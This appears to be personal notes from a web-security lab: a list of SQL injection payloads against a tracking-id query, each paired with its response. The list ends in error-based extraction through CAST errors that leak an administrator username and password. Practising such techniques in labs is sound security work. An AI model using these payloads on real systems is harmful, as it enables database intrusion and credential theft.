```bash
' --;  // 200

' and true --;  // 200

' and 1=2 --;  // 200

' and 1=1 #; // 500 <h4>Unterminated string literal started at position 62 in SQL SELECT * FROM tracking WHERE id = '6wTDiHjMr8gdFzB4' and 1=2 #'. Expected  char</h4>
                    <p class=is-warning>Unterminated string literal started at position 62 in SQL SELECT * FROM tracking WHERE id = '6wTDiHjMr8gdFzB4' and 1=2 #'. Expected  char</p>

' and CAST((SELECT username FROM users LIMIT 1) AS Int) --;  ERROR: argument of AND must be type boolean, not type integer

' and CAST((SELECT username FROM users LIMIT 1) AS Bool) --;  ERROR: invalid input syntax for type boolean: "administrator"

' and CAST((SELECT password FROM users LIMIT 1) AS Bool) --;  ERROR: invalid input syntax for type boolean: "4re87hj8j37r6p00dukm"
```
